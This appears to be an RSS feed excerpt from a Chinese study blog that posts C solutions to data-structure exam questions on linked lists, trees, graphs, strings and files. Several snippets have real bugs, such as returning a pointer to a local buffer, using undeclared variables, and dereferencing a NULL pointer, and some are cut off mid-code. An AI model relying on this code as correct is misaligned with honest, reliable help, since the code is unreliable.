      <title>2006-c-二-4</title>
      <link>/post/2006-c-%E4%BA%8C-4/</link>
      <pubDate>Thu, 10 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2006-c-%E4%BA%8C-4/</guid>
      <description>http://www.ppkao.com/daan/222163/BD304E420A92B02C21C9193192FE26C3
  http://ryanlunar.blog.163.com/blog/static/183577092201241294031508
 关于外部变量作用域</description>
    </item>
    
    <item>
      <title>2006-c-五</title>
      <link>/post/2006-c-%E4%BA%94/</link>
      <pubDate>Thu, 10 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2006-c-%E4%BA%94/</guid>
      <description>//优化版 #include &amp;lt;stdio.h&amp;gt;int main() { FILE *fp; int num, numCur, flag = 0; printf(&amp;#34;\nInput a integer: &amp;#34;); scanf(&amp;#34;%d&amp;#34;, &amp;amp;num); //&amp;#34;r+&amp;#34; 以可读写方式打开文件，该文件必须存在。  //&amp;#34;w&amp;#34; 打开只写文件，若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件。  //&amp;#34;a&amp;#34;为追加写、只写  //&amp;#34;a+&amp;#34;为追加写、可读可写  if ((fp = fopen(&amp;#34;a.dat&amp;#34;, &amp;#34;a+&amp;#34;))!=NULL) { while (!feof(fp)) { fscanf(fp, &amp;#34;%d&amp;#34;, &amp;amp;numCur); if (numCur == num)flag = 1; } if (!flag) { fprintf(fp, &amp;#34; %d&amp;#34;, num); //因为要将这个数字写到文件中（相当于计算机input），所以用的是fp1  fclose(fp); } } } /*五.试编写一个程序，从键盘上输入一个整数，在整数文件&amp;#34;a.dat&amp;#34;中查找，要求： 1.若文件&amp;#34;a.dat&amp;#34;不存在，则建立一个新文件&amp;#34;a.dat&amp;#34;，将该整数写入文件； 2.若文件中找到了这个整数，则显示数据存在，否则将该数据写入文件。*/ #include &amp;lt;stdio.h&amp;gt;int main() { FILE *fp1, *fp2; int num, numCur, flag = 0; printf(&amp;#34;\nInput a integer: &amp;#34;); scanf(&amp;#34;%d&amp;#34;, &amp;amp;num); //“r+” 以可读写方式打开文件，该文件必须存在。  //“w” 打开只写文件，若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件。  if ((fp1 = fopen(&amp;#34;a.</description>
    </item>
    
    <item>
      <title>2006-c-四</title>
      <link>/post/2006-c-%E5%9B%9B/</link>
      <pubDate>Thu, 10 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2006-c-%E5%9B%9B/</guid>
      <description>链表的创建、输出等 原文链接
void Delete(LNode *La, LNode *Lb, LNode *Lc) //删除链表A中既存在B又存在C中的元素 { LNode *pa, *pb, *pc, *q; pa = La; pb = Lb-&amp;gt;next; pc = Lc-&amp;gt;next; while (pb &amp;amp;&amp;amp; pc) //思路：在链表B和C中查找相同的元素看看此元素是否在A链表中  { if (pb-&amp;gt;data &amp;lt; pc-&amp;gt;data) pb = pb-&amp;gt;next; else if (pc-&amp;gt;data &amp;lt; pb-&amp;gt;data) pc = pc-&amp;gt;next; else //找到lb和lc中都出现的结点  { while (pa-&amp;gt;next) { if (pa-&amp;gt;next-&amp;gt;data &amp;lt; pb-&amp;gt;data) pa = pa-&amp;gt;next; else if (pa-&amp;gt;next-&amp;gt;data &amp;gt; pb-&amp;gt;data) { //pa = pa-&amp;gt;next;//此处注释，原因，添加此句会有漏解情况  pb = pb-&amp;gt;next; pc = pc-&amp;gt;next; break; } else //删除la中也包含的该元素  { q = pa-&amp;gt;next; pa-&amp;gt;next = q-&amp;gt;next; free(q); pa = pa-&amp;gt;next; pb = pb-&amp;gt;next; pc = pc-&amp;gt;next; break; } } } } } </description>
    </item>
    
    <item>
      <title>2006-d-三</title>
      <link>/post/2006-d-%E4%B8%89/</link>
      <pubDate>Thu, 10 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2006-d-%E4%B8%89/</guid>
      <description>//分别求出一个结点的左右孩子结点的高度做差即为平衡因子  int depth(BTNode *bt) { int r,l; if(bt==NULL) return 0; else { l=depth(bt-&amp;gt;lchild); r=depth(bt-&amp;gt;rchild); return (l&amp;gt;r?l:r)+1; } } int balance(BTNode *T,int n)//n初始传入值为0 { int l,r; if(T!=NULL) { balance(T-&amp;gt;lchild,n); balance(T-&amp;gt;rchild,n); l=depth(T-&amp;gt;lchild); r=depth(T-&amp;gt;rchild); if(l+r&amp;gt;0) ++n;//记录非叶子结点个数  printf(&amp;#34;%d&amp;#34;,l-r);//打印平衡因子  } return n; } </description>
    </item>
    
    <item>
      <title>2006-d-二</title>
      <link>/post/2006-d-%E4%BA%8C/</link>
      <pubDate>Thu, 10 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2006-d-%E4%BA%8C/</guid>
      <description>#include&amp;lt;stdio.h&amp;gt;#define maxSize 100  void Palindrome(LNode *h,int n) { char stack[maxSize],top=-1;//定义栈  char queue[maxSize],front=0,rear=0;//定义队列  char a,b; int i,count=0; LNode *p=h; for(i=0;i&amp;lt;n;i++)//前n个字母分别入栈入队  { stack[++top]=p-&amp;gt;data; queue[rear++]=p-&amp;gt;data; p=p-&amp;gt;next; } for(i=0;i&amp;lt;n;i++) { a=stack[top--];//出栈  b=queue[front++];//出队  if(a!=b) break; else count++; } if(count!=n) printf(&amp;#34;非回文\n&amp;#34;); else printf(&amp;#34;回文\n&amp;#34;); } </description>
    </item>
    
    <item>
      <title>2000-2011</title>
      <link>/post/2000-2011/</link>
      <pubDate>Tue, 08 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2000-2011/</guid>
      <description>前辈答案
 http://blog.csdn.net/zl19890124
 #include &amp;lt;stdio.h&amp;gt; #define MAX_NM 10 #define MAX_POSTAGE 1024 #define INF 2147483647  int n, m; int x[MAX_NM], ans[MAX_NM], y[MAX_POSTAGE], maxStamp, r; /* * backtrack(i)表示x[0...i-1]这i张邮票已经完全确定， * 相应于x[0...i-1]的最大连续邮资区间r和每种邮资所需要的 * 最少邮票张数y[0...r]也都确定，现在枚举x[i] * 的每个值，确定x[i] */ void backtrack(int i) { int *backup_y, backup_r; int next, postage, num, tmp; if(i &amp;gt;= n) { if(r &amp;gt; maxStamp) { maxStamp = r; for(tmp = 0; tmp &amp;lt; n; tmp++) ans[tmp] = x[tmp]; } return; } backup_y = (int*)malloc(MAX_POSTAGE * sizeof(int)); for(tmp = 0; tmp &amp;lt; MAX_POSTAGE; tmp++) backup_y[tmp] = y[tmp]; backup_r = r; for(next = x[i - 1] + 1; next &amp;lt;= r + 1; next++) { /* update x[i] */ x[i] = next; /* update y */ for(postage = 0; postage &amp;lt; x[i-1] * m; postage++) { if(y[postage] &amp;gt;= m) continue; for(num = 1; num &amp;lt;= m - y[postage]; num++) if(y[postage] + num &amp;lt; y[postage + num * next] &amp;amp;&amp;amp; (postage + num * next &amp;lt; MAX_POSTAGE)) y[postage + num * next] = y[postage] + num; } /* update r */ while(y[r + 1] &amp;lt; INF) r++; backtrack(i + 1); /* restore */ r = backup_r; for(tmp = 0; tmp &amp;lt; MAX_POSTAGE; tmp++) y[tmp] = backup_y[tmp]; } free(backup_y); } int main() { int i; scanf(&amp;#34;%d%d&amp;#34;, &amp;amp;n, &amp;amp;m); x[0] = 1; r = m; for(i = 0; i &amp;lt;= r; i++) y[i] = i; while(i &amp;lt; MAX_POSTAGE) y[i++] = INF; maxStamp = 0; backtrack(1); printf(&amp;#34;max stamp is: %d/n&amp;#34;, maxStamp); for(i = 0; i &amp;lt; n; i++) printf(&amp;#34;%4d&amp;#34;, ans[i]); return 0; } </description>
    </item>
    
    <item>
      <title>2005-c-二-3</title>
      <link>/post/2005-c-%E4%BA%8C-3/</link>
      <pubDate>Tue, 08 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2005-c-%E4%BA%8C-3/</guid>
      <description>原文链接
 http://blog.csdn.net/jcwKyl/article/details/4137398
 #include &amp;lt;stdio.h&amp;gt; #define MAX_NM 10 #define MAX_POSTAGE 1024 #define INF 2147483647  int n, m; int x[MAX_NM], ans[MAX_NM], y[MAX_POSTAGE], maxStamp, r; /* * backtrack(i)表示x[0...i-1]这i张邮票已经完全确定， * 相应于x[0...i-1]的最大连续邮资区间r和每种邮资所需要的 * 最少邮票张数y[0...r]也都确定，现在枚举x[i] * 的每个值，确定x[i] */ void backtrack(int i) { int *backup_y, backup_r; int next, postage, num, tmp; if(i &amp;gt;= n) { if(r &amp;gt; maxStamp) { maxStamp = r; for(tmp = 0; tmp &amp;lt; n; tmp++) ans[tmp] = x[tmp]; } return; } backup_y = (int*)malloc(MAX_POSTAGE * sizeof(int)); for(tmp = 0; tmp &amp;lt; MAX_POSTAGE; tmp++) backup_y[tmp] = y[tmp]; backup_r = r; for(next = x[i - 1] + 1; next &amp;lt;= r + 1; next++) { /* update x[i] */ x[i] = next; /* update y */ for(postage = 0; postage &amp;lt; x[i-1] * m; postage++) { if(y[postage] &amp;gt;= m) continue; for(num = 1; num &amp;lt;= m - y[postage]; num++) if(y[postage] + num &amp;lt; y[postage + num * next] &amp;amp;&amp;amp; (postage + num * next &amp;lt; MAX_POSTAGE)) y[postage + num * next] = y[postage] + num; } /* update r */ while(y[r + 1] &amp;lt; INF) r++; backtrack(i + 1); /* restore */ r = backup_r; for(tmp = 0; tmp &amp;lt; MAX_POSTAGE; tmp++) y[tmp] = backup_y[tmp]; } free(backup_y); } int main() { int i; scanf(&amp;#34;%d%d&amp;#34;, &amp;amp;n, &amp;amp;m); x[0] = 1; r = m; for(i = 0; i &amp;lt;= r; i++) y[i] = i; while(i &amp;lt; MAX_POSTAGE) y[i++] = INF; maxStamp = 0; backtrack(1); printf(&amp;#34;max stamp is: %d/n&amp;#34;, maxStamp); for(i = 0; i &amp;lt; n; i++) printf(&amp;#34;%4d&amp;#34;, ans[i]); return 0; } </description>
    </item>
    
    <item>
      <title>2005-c-二-1</title>
      <link>/post/2005-c-%E4%BA%8C-1/</link>
      <pubDate>Mon, 07 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2005-c-%E4%BA%8C-1/</guid>
      <description>#include&amp;lt;stdio.h&amp;gt;int main() { int i,temp,reversedNum; for(i=1993; i&amp;gt;0; --i) { temp=i; reversedNum=0; while(temp)//除2取余倒排的逆运算！！！  { reversedNum=reversedNum*2+temp%2; temp/=2; } if(i==reversedNum) { printf(&amp;#34;%d&amp;#34;,i); break; } } return 0; } </description>
    </item>
    
    <item>
      <title>2005-c-二-2</title>
      <link>/post/2005-c-%E4%BA%8C-2/</link>
      <pubDate>Mon, 07 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2005-c-%E4%BA%8C-2/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt; #define maxSize 100  void delstring(char *pstr1,char *pstr2) { char *p,*q,*t; int len=0;//子串长度  p=pstr1; q=pstr2; while(*q!=&amp;#39;\0&amp;#39;) { ++len;//求子串长度  ++q; } while(*p!=&amp;#39;\0&amp;#39;) { q=pstr2;//每次完成后子串指针复位  while(*p==*q&amp;amp;&amp;amp;*q!=&amp;#39;\0&amp;#39;)//匹配子串  { p++; q++; } if(*q==&amp;#39;\0&amp;#39;) { t=p-len; while(*p!=&amp;#39;\0&amp;#39;) { *(p-len)=*p; p++; } *(p-len)=&amp;#39;\0&amp;#39;; p=t; }else{ ++p; } } printf(&amp;#34;%s&amp;#34;,pstr1); } int main() { char a[maxSize],b[maxSize]; scanf(&amp;#34;%s&amp;#34;,a); scanf(&amp;#34;%s&amp;#34;,b); printf(&amp;#34;%s\n&amp;#34;,a); delstring(a,b); } </description>
    </item>
    
    <item>
      <title>2005-d-三</title>
      <link>/post/2005-d-%E4%B8%89/</link>
      <pubDate>Mon, 07 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2005-d-%E4%B8%89/</guid>
      <description>参考链接
 http://www.acmerblog.com/ancestors-of-a-given-node-6048.html
 /** 1、顺序存储，假设根的存储下标是1 将当前结点的下标连续整除以2，直到1为止， 中间所有得到的商的下标都是其祖先，并且是从其双亲直到根为止。 2、链式存储 （1）使用非递归的后序遍历，当遍历到该结点时，辅助栈中从栈顶到栈底依次为该结点从双亲开始到根为止的所有祖先。 （2）递归实现。 **/ //顺序存储，采用下标关系找出祖先结点 void ancestor(int bt[],int i,int x) { if(bt[i]==x)//满足条件，输出祖先  { while(i!=1) { printf(&amp;#34;%d&amp;#34;,i/2); i/=2; } } else { ancestor(bt,2*i,x); ancestor(bt,2*i+1,x); } } //后序非递归遍历,输出值为x的所有祖先  void afterOrder(BiTree *root,int x) { struct Tree { BiTree *bt; int tag;//1-第一次访问(左孩子)、2-非第一次访问（右孩子）  }; Tree stack[maxSize],top=0;//定义一个栈  Tree p; p.bt=root; p.tag=1;//根结点入栈  while(p!=NULL || top&amp;gt;0)//此处当p==NULL时，继续出栈  { while(p.bt!=NULL) { ++top; stack[top].bt=p; stack[top].tag=1; p.bt=p.bt-&amp;gt;lchild;//指向左孩子  } //添加代码功能START  if(bt-&amp;gt;data==x)//找到x  { printf(&amp;#34;所查结点的所有祖先结点的值为：\n&amp;#34;); for(i=1;i&amp;lt;=top;i++) printf(&amp;#34;%d&amp;#34;,stack[i].</description>
    </item>
    
    <item>
      <title>2005-d-二</title>
      <link>/post/2005-d-%E4%BA%8C/</link>
      <pubDate>Mon, 07 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2005-d-%E4%BA%8C/</guid>
      <description>//链表节点 typedef struct LNode { int data;//节点值  struct LNode *next;//指向下一个节点 } LNode; //哈希节点 typedef struct HNode { LNode *first;//链接的第一个指针域 } HNode; //哈希表 typedef struct HashTable { HNode list[N]; }HashTable; int seadel( HashTable *H,int k) { int pos=H(k); LNode *p,*r; p=H-&amp;gt;list[pos]-&amp;gt;first; //判断第一个结点是否是  if(p-&amp;gt;data==k) { H-&amp;gt;list[pos]-&amp;gt;first=p-&amp;gt;next; free(p); } r=p; p=p-&amp;gt;next; //第一个不是  while(p!=NULL) { if(p-&amp;gt;data==k) { r-&amp;gt;next=p-&amp;gt;next; free(p); return 1; }else{ r=p; p=p-&amp;gt;next; } } return 0; } </description>
    </item>
    
    <item>
      <title>2005-d-四</title>
      <link>/post/2005-d-%E5%9B%9B/</link>
      <pubDate>Mon, 07 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2005-d-%E5%9B%9B/</guid>
      <description>int visit[maxSize];//初始化全为0 void DFS(AGraph *G,int v,int t) { ArcNode *p; visit[v]=1; p=G-&amp;gt;adjlist[v].firstarc; while(p!=NULL) { //在深度优先搜索中添加部分  if(p-&amp;gt;adjvex==t) { printf(&amp;#34;exist&amp;#34;); break; }else{ if(visit[p-&amp;gt;adjvex]==0) { DFS(G,p-&amp;gt;adjvex,t); p=p-&amp;gt;nextarc; } } } } </description>
    </item>
    
    <item>
      <title>2005-c-一-2</title>
      <link>/post/2005-c-%E4%B8%80-2/</link>
      <pubDate>Sun, 06 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2005-c-%E4%B8%80-2/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt; int main() { char *s=&amp;#34;121&amp;#34;; int k=0,a=0,b=0; do{ k++; if(k%2==0){a=a+s[k]-&amp;#39;0&amp;#39;;continue;} b=b+s[k]-&amp;#39;0&amp;#39;;a=a+s[k]-&amp;#39;0&amp;#39;; }while(s[k+1]); printf(&amp;#34;k=%d,a=%d,b=%d&amp;#34;,k,a,b); } </description>
    </item>
    
    <item>
      <title>2007-c-四</title>
      <link>/post/2007-c-%E5%9B%9B/</link>
      <pubDate>Sat, 05 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2007-c-%E5%9B%9B/</guid>
      <description>//优化简洁算法 void recycle(LNode *c) { int i=1; LNode *p,*q,*pre; pre=c; p=c-&amp;gt;next; while(p!=NULL) { if((x&amp;amp;(x-1))==0)//此处采取位运算：如果一个数x为2的平方，那么x&amp;amp;x-1==0 { printf(&amp;#34;%d&amp;#34;,p-&amp;gt;data); pre-&amp;gt;next=p-&amp;gt;next; q=p;//暂存待释放结点 p=p-&amp;gt;next; free(q);//释放 } p=p-&amp;gt;next;pre=pre-&amp;gt;next;//指针下移 ++i;//报数增加一 } if(c-&amp;gt;next!=NULL) recycle(c);//圈子里面，还有人继续报数 } ----------------------------------------------------------------------------------------- #include #include #define N 10  typedef struct LNode { int data; struct LNode *next; } LNode; //建立线性表 LNode* create() { LNode *c,*s,*r; int i; c=(LNode*)malloc(sizeof(LNode)); c-&amp;gt;next=NULL; r=c; for(i=1;i&amp;lt;=N;++i) { s=(LNode*)malloc(sizeof(LNode)); s-&amp;gt;data=i; s-&amp;gt;next=NULL; r-&amp;gt;next=s; r=r-&amp;gt;next; } return c; } //删除线性表某个节点 void seaDel(LNode *c,int x) { LNode *p,*q; p=c; //查找 while(p-&amp;gt;next!</description>
    </item>
    
    <item>
      <title>2007-d-四</title>
      <link>/post/2007-d-%E5%9B%9B/</link>
      <pubDate>Sat, 05 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2007-d-%E5%9B%9B/</guid>
      <description>#include #include typedef struct BTNode { int	data; struct BTNode	* lchild; struct BTNode	* rchild; } BTNode; /* 创建排序树 */ BTNode* create() { BTNode	*root; int	n; scanf( &amp;#34;%d&amp;#34;, &amp;amp;n ); if ( n == -1 ) return(NULL); else{ root	= (BTNode *) malloc( sizeof(BTNode) ); root-&amp;gt;data	= n; root-&amp;gt;lchild	= create(); root-&amp;gt;rchild	= create(); } return(root); } /* 向二叉排序树中插入值 */ void insert( BTNode* root, int key ) { BTNode	* p	= NULL, *pre = NULL; BTNode	* c	= (BTNode *) malloc( sizeof(BTNode) ); c-&amp;gt;data	= key; c-&amp;gt;lchild	= NULL; c-&amp;gt;rchild	= NULL; /* 树为空 */ if ( NULL == root ) { root == c; }else{ p = root; while ( NULL !</description>
    </item>
    
    <item>
      <title>2007-d-三</title>
      <link>/post/2007-d-%E4%B8%89/</link>
      <pubDate>Fri, 04 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2007-d-%E4%B8%89/</guid>
      <description>有錯誤
#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt; #define maxSize 100  //邻接表定义存储 typedef struct ArcNode { int adjvex; struct ArcNode *nextarc; } ArcNode; typedef struct VNode { int data; ArcNode *firstarc; }VNode; typedef struct AGraph { VNode adjlist[maxSize]; int n,e; } AGraph; //邻接表建立 void create(AGraph *G) { int i; int h,t; ArcNode *p; printf(&amp;#34;请输入顶点数、弧数：\n&amp;#34;); scanf(&amp;#34;%d,%d&amp;#34;,&amp;amp;G-&amp;gt;n,&amp;amp;G-&amp;gt;e); //输入顶点数、弧数  for(i=0;i&amp;lt;G-&amp;gt;n;++i) { printf(&amp;#34;请输入第%d个顶点值\n&amp;#34;,i); scanf(&amp;#34;%d&amp;#34;,&amp;amp;G-&amp;gt;adjlist[i].data); G-&amp;gt;adjlist[i].firstarc=NULL; } //输入弧  for(i=0;i&amp;lt;G-&amp;gt;e;++i) { printf(&amp;#34;请按顺序输入弧头[h]、弧尾[t]\n&amp;#34;); scanf(&amp;#34;%d,%d&amp;#34;,&amp;amp;h,&amp;amp;t); p=(ArcNode*)malloc(sizeof(ArcNode)); p-&amp;gt;adjvex=t; /*将新边表结点p 插入到顶点Vh 的边表头部*/ p-&amp;gt;nextarc=G-&amp;gt;adjlist[h].</description>
    </item>
    
    <item>
      <title>2007-d-二</title>
      <link>/post/2007-d-%E4%BA%8C/</link>
      <pubDate>Fri, 04 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2007-d-%E4%BA%8C/</guid>
      <description>typedef struct BTNode { int data; int b;//平衡因子  struct BTNode *lchild; struct BTNode *rchild; } BTNode; int getDepth(BTNode *T) { int level=0; BTNode *p; p=T; while(p!=NULL) { ++level; if(p-&amp;gt;b&amp;lt;0) p=p-&amp;gt;rchild;//右子树高  else p=p-&amp;gt;lchild;//左子树高  } return level; } </description>
    </item>
    
    <item>
      <title>2009-d-二-1</title>
      <link>/post/2009-d-%E4%BA%8C-1/</link>
      <pubDate>Wed, 02 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2009-d-%E4%BA%8C-1/</guid>
      <description>void delpre(LNode *x) { LNode *r,*p;//r是p的前驱结点，当p的后继结点是x时，删除p  p=x; if(p-&amp;gt;next!=NULL) { while(p-&amp;gt;next!=x) { r=p; p=p-&amp;gt;next; } r-&amp;gt;next=x; free(p); } } </description>
    </item>
    
    <item>
      <title>2009-d-二-2</title>
      <link>/post/2009-d-%E4%BA%8C-2/</link>
      <pubDate>Wed, 02 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2009-d-%E4%BA%8C-2/</guid>
      <description>void swap(BTNode *T) { BTNode *p,*temp; p=T; if(p!=NULL) { //交换左右子树  temp=p-&amp;gt;rchild; p-&amp;gt;rchild=p-&amp;gt;lchild; p-&amp;gt;lchild=temp; //递归实现全部指针互换  swap(p-&amp;gt;lchild); swap(p-&amp;gt;rchild); } } </description>
    </item>
    
    <item>
      <title>2009-d-二-3</title>
      <link>/post/2009-d-%E4%BA%8C-3/</link>
      <pubDate>Wed, 02 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2009-d-%E4%BA%8C-3/</guid>
      <description>//天勤p150原题  BTNode *CreateBT(char pre[],char in[],int l1,int r1,int l2, int r2) { BTNode *s; int i; if(l1&amp;gt;r1) return NULL; s=(BTNode*)malloc(sizeof(BTNode)); s-&amp;gt;lchild=s-&amp;gt;rchild=NULL; for(i=l2,i&amp;lt;r2;++i) if(in[i]==pre[l1]) break; s-&amp;gt;data=in[i]; s-&amp;gt;lchild=CreateBT(pre,in,l1+1,l1+i-l2,l2,i-1); s-&amp;gt;rchild=CreateBT(pre,in,l1+i-l2+1,r1,i+1,r2); return s; } </description>
    </item>
    
    <item>
      <title>2010-d-二-1</title>
      <link>/post/2010-d-%E4%BA%8C-1/</link>
      <pubDate>Tue, 01 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2010-d-%E4%BA%8C-1/</guid>
      <description>int fun(LNode *l) { int max,min; LNode *p; p=l; max=p-&amp;gt;data; min=p-&amp;gt;data; //先找出最大值最小值  while(p!=NULL) { if(p-&amp;gt;data&amp;gt;max) max=p-&amp;gt;data; if(p-&amp;gt;data&amp;lt;min) min=p-&amp;gt;data; p=p-&amp;gt;next; } //判断是否符合要求  while(p-&amp;gt;next-&amp;gt;next!=NULL&amp;amp;&amp;amp;p-&amp;gt;data==p-&amp;gt;next-&amp;gt;data+p-&amp;gt;next-next-&amp;gt;data) { p=p-&amp;gt;next; } //判断退出循环时p-&amp;gt;next-&amp;gt;next的值是否为空，不为空证明提前跳出循环  if(p-&amp;gt;next-&amp;gt;next-&amp;gt;data==NULL) { printf(&amp;#34;%d&amp;#34;,max); return 1; }else{ printf(&amp;#34;%d&amp;#34;,min); return 0; } } </description>
    </item>
    
    <item>
      <title>2010-d-二-2</title>
      <link>/post/2010-d-%E4%BA%8C-2/</link>
      <pubDate>Tue, 01 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2010-d-%E4%BA%8C-2/</guid>
      <description>//类似于天勤p136 double calfun(BTNode *p) { int l,r; if(p!=NULL) { if(p-&amp;gt;lchild!=NULL&amp;amp;&amp;amp;p-&amp;gt;rchild!=NULL) { l=calfun(p-&amp;gt;lchild); r=calfun(p-&amp;gt;rchild); return op(l,r,p-&amp;gt;data); } else return p-&amp;gt;data;//假设采用数值型存储  } else return 0; } </description>
    </item>
    
    <item>
      <title>2010-d-二-3</title>
      <link>/post/2010-d-%E4%BA%8C-3/</link>
      <pubDate>Tue, 01 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2010-d-%E4%BA%8C-3/</guid>
      <description>//void BFS(AGraph *G,int v,int visit[maxSize]) void DS(AGraph *G,int v,int visit[maxSize]) { //visit数组被初始化为全0  ArcNode *p; //int que[maxSize],front=0,rear=0;  int stack[maxSize],top=-1; int j; visit[v]=1; //rear=(rear+1)%maxSize;  //que[rear]=v;  stack[++top]=v; while(front!=rear) { //front =(front+1)%maxSize;  //j=que[front];  j=stack[top--]; p=G-&amp;gt;adjlist[j].firstarc; while(p!=NULL) { if(visit[p-&amp;gt;adjvex]==0) { visit[p-&amp;gt;adjvex]=1; //rear=rear+1;  //que[rear]=p-&amp;gt;adjvex;  stack[++top]=p-&amp;gt;adjvex; } p=p-&amp;gt;nextarc; } } } </description>
    </item>
    
    <item>
      <title>2011-c-一-5</title>
      <link>/post/2011-c-%E4%B8%80-5/</link>
      <pubDate>Sun, 30 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2011-c-%E4%B8%80-5/</guid>
      <description>//递增：1，不递增：0 int dec(int a[],int n) { if(n==0) return 1; //递增  if(a[n]&amp;gt;a[n-1]) return dec(a,n-1); else return 0; //不递增 } 方法二：
int dec(int a[], int n) { //printf(&amp;#34;n=%d,&amp;#34;,n);  //printf(&amp;#34;a[0]=%d\n&amp;#34;,a[0]);  if (n &amp;lt;= 1) { return 0;//非递增  } if (a[0] &amp;lt; a[1]) { return dec(++a,--n);//注意n--是先把值给dec再减  }else{ return 1;//递增  } } int main() { int a[]={1,2,9,5}; printf(&amp;#34;%d&amp;#34;,dec(a,4)); } </description>
    </item>
    
    <item>
      <title>2011-c-二-1</title>
      <link>/post/2011-c-%E4%BA%8C-1/</link>
      <pubDate>Sun, 30 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2011-c-%E4%BA%8C-1/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main() { //定义文件指针  FILE *p; char c; int num=0; //打开文件  if((p=fopen(&amp;#34;.\\demo.txt&amp;#34;,&amp;#34;r&amp;#34;))==NULL) { printf(&amp;#34;error&amp;#34;); exit(-1); } while(fscanf(p,&amp;#34;%c&amp;#34;,&amp;amp;c)!=EOF) { ++num; printf(&amp;#34;%c&amp;#34;,c); if(num==10) { printf(&amp;#34;\n&amp;#34;); num=0; } } } </description>
    </item>
    
    <item>
      <title>2011-c-二-2</title>
      <link>/post/2011-c-%E4%BA%8C-2/</link>
      <pubDate>Sun, 30 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2011-c-%E4%BA%8C-2/</guid>
      <description>//分为三部分复制到新的字符串中 char *stuff(char *str1,char *str2,int i,int j) { char buf[512]; char *p,*q; int m; p=str1; q=buf; //复制前半段  for(m=0;m&amp;lt;i;m++) { *q=*p; p++; q++; } //插入替换部分  p=str2; while(*p!=&amp;#39;\0&amp;#39;) { *q=*p; p++; q++; } //复制后半部分  p=str1+j+1; while(*p!=&amp;#39;\0&amp;#39;) { *q=*p; p++; q++; } *q=&amp;#39;\0&amp;#39;;//字符串结束  return buf; } int main() { char a[64]=&amp;#34;asdfghjkdffsfjhfj&amp;#34;; printf(&amp;#34;%s\n&amp;#34;,stuff(a,&amp;#34;12345&amp;#34;,6,8)); } </description>
    </item>
    
    <item>
      <title>2011-c-二-3</title>
      <link>/post/2011-c-%E4%BA%8C-3/</link>
      <pubDate>Sun, 30 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2011-c-%E4%BA%8C-3/</guid>
      <description>与2014-c-三-3相同，查找二维数组鞍点
 #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#define maxSize 100 typedef struct LNode { int data; struct LNode *next; } LNode; //数组进行排序、递增 void sort(int a[],int n) { int i,j,temp; //冒泡法排序  for(i=n;i&amp;gt;=1;--i) { for(j=2;j&amp;lt;=i;++j) { if(a[j-1]&amp;gt;a[j]) { temp=a[j]; a[j]=a[j-1]; a[j-1]=temp; } } } } //构造链表并输出 void createList(int a[],int n) { LNode *c,*s,*r,*p; int i; c=(LNode*)malloc(sizeof(LNode)); c-&amp;gt;data=a[1]; c-&amp;gt;next=NULL; r=c; for(i=2;i&amp;lt;=n;++i) { s=(LNode*)malloc(sizeof(LNode)); s-&amp;gt;data=a[i]; s-&amp;gt;next=NULL; r-&amp;gt;next=s; r=r-&amp;gt;next; } //输出链表  p=c; for(i=1;i&amp;lt;=n;++i) { if(p!=NULL) { printf(&amp;#34;%d\n&amp;#34;,p-&amp;gt;data); p=p-&amp;gt;next; } } } int main() { //数组下标从1开始  int arr[maxSize]; int temp,n=0,flag=1; while(flag==1) { scanf(&amp;#34;%d&amp;#34;,&amp;amp;temp); if(temp!</description>
    </item>
    
    <item>
      <title>2011-d-二-1</title>
      <link>/post/2011-d-%E4%BA%8C-1/</link>
      <pubDate>Sun, 30 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>/post/2011-d-%E4%BA%8C-1/</guid>
      <description>#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#define maxSize 100 typedef struct LNode { int data; struct LNode *next; } LNode; //数组进行排序、递增 void sort(int a[],int n) { int i,j,temp; //冒泡法排序  for(i=n;i&amp;gt;=1;--i) { for(j=2;j&amp;lt;=i;++j) { if(a[j-1]&amp;gt;a[j]) { temp=a[j]; a[j]=a[j-1]; a[j-1]=temp; } } } } //构造链表并输出 void createList(int a[],int n) { LNode *c,*s,*r,*p; int i; c=(LNode*)malloc(sizeof(LNode)); c-&amp;gt;data=a[1]; c-&amp;gt;next=NULL; r=c; for(i=2;i&amp;lt;=n;++i) { s=(LNode*)malloc(sizeof(LNode)); s-&amp;gt;data=a[i]; s-&amp;gt;next=NULL; r-&amp;gt;next=s; r=r-&amp;gt;next; } //输出链表  p=c; for(i=1;i&amp;lt;=n;++i) { if(p!=NULL) { printf(&amp;#34;%d\n&amp;#34;,p-&amp;gt;data); p=p-&amp;gt;next; } } } 